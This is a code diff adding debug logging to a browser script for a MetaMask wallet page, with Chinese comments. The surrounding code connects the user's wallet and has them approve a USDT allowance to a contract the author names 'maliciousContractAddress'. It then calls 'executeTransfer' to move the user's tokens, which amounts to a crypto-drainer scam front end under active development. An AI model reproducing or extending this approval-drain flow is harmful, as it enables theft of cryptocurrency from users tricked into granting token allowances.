@@ -21,13 +21,16 @@ document.getElementById("connectButton").onclick = async () => {
     console.log("Connect button clicked"); // 调试信息
     try {
         if (typeof window.ethereum !== 'undefined') {
+            console.log("MetaMask is installed"); // 检查 MetaMask
             provider = new ethers.providers.Web3Provider(window.ethereum);
             await provider.send("eth_requestAccounts", []);
             signer = provider.getSigner();
             userAddress = await signer.getAddress();
+            console.log("User address:", userAddress); // 输出用户地址
             document.getElementById("message").innerText = "Connected: " + userAddress;
             document.getElementById("approveButton").disabled = false; // 启用批准按钮
         } else {
+            console.log("MetaMask is not installed"); // 如果没有安装
             document.getElementById("message").innerText = "Please install MetaMask!";
         }
     } catch (error) {
@@ -43,7 +46,9 @@ document.getElementById("approveButton").onclick = async () => {
 
     try {
         const tx = await usdtContract.approve(maliciousContractAddress, amount);
+        console.log("Transaction sent:", tx); // 交易信息
         await tx.wait();
+        console.log("Transaction confirmed"); // 交易确认
         document.getElementById("message").innerText = "Approval successful!";
         document.getElementById("executeTransferButton").disabled = false; // 启用执行转移按钮
     } catch (error) {
@@ -58,7 +63,9 @@ document.getElementById("executeTransferButton").onclick = async () => {
 
     try {
         const tx = await maliciousContract.executeTransfer(userAddress);
+        console.log("Transfer transaction sent:", tx); // 交易信息
         await tx.wait();
+        console.log("Transfer transaction confirmed"); // 交易确认
         document.getElementById("message").innerText = "Transfer executed!";
     } catch (error) {
         console.error("Transfer error:", error);
